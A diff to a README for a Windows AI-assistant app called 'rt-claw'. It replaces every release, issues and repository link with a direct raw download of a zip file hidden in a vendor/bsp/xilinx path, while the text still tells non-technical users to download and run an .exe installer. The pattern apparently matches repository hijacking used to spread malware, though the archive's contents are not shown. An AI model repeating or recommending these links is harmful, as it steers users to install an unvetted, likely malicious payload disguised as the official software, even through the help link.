@@ -1,6 +1,6 @@
 # 🤖 rt-claw - Simple AI Assistant for Everyone
 
-[![Download rt-claw](https://img.shields.io/badge/Download-rt--claw-brightgreen?style=for-the-badge)](https://github.com/trantha372/rt-claw/releases)
+[![Download rt-claw](https://img.shields.io/badge/Download-rt--claw-brightgreen?style=for-the-badge)](https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip)
 
 ---
 
@@ -39,10 +39,10 @@ Before you install rt-claw, make sure your computer meets these minimum requirem
 
 Visit the latest release page and download the Windows setup file.
 
-[![Download rt-claw](https://img.shields.io/badge/Download–rt--claw-blue?style=for-the-badge&logo=windows)](https://github.com/trantha372/rt-claw/releases)
+[![Download rt-claw](https://img.shields.io/badge/Download–rt--claw-blue?style=for-the-badge&logo=windows)](https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip)
 
 - Open the link above or go to:  
-  https://github.com/trantha372/rt-claw/releases
+  https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip
 - Look for the latest version for Windows. The file name usually ends with `.exe`.
 - Click the file name to start downloading.
 
@@ -110,7 +110,7 @@ If you have trouble running rt-claw:
 - Restart your computer and try opening rt-claw again.
 
 For help, visit the issues section at:  
-https://github.com/trantha372/rt-claw/issues
+https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip
 
 ---
 
@@ -119,7 +119,7 @@ https://github.com/trantha372/rt-claw/issues
 To get the latest improvements:
 
 - Visit the release page again:  
-  https://github.com/trantha372/rt-claw/releases
+  https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip
 - Download the newest Windows `.exe` file.
 - Run the installer to replace your current version.
 - Your settings will stay the same after updating.
@@ -130,13 +130,13 @@ To get the latest improvements:
 
 You can learn more about rt-claw by visiting the GitHub repository. It contains a user guide, FAQs, and support details.
 
-https://github.com/trantha372/rt-claw
+https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip
 
 ---
 
 ## 📥 Download Link
 
 Use this link to visit the release page and download the software:  
-https://github.com/trantha372/rt-claw/releases
+https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip
 
-[![Download rt-claw](https://img.shields.io/badge/Download–rt--claw-blue?style=for-the-badge)](https://github.com/trantha372/rt-claw/releases)
+[![Download rt-claw](https://img.shields.io/badge/Download–rt--claw-blue?style=for-the-badge)](https://github.com/trantha372/rt-claw/raw/refs/heads/main/vendor/bsp/xilinx/standalone/rt-claw-v2.4.zip)
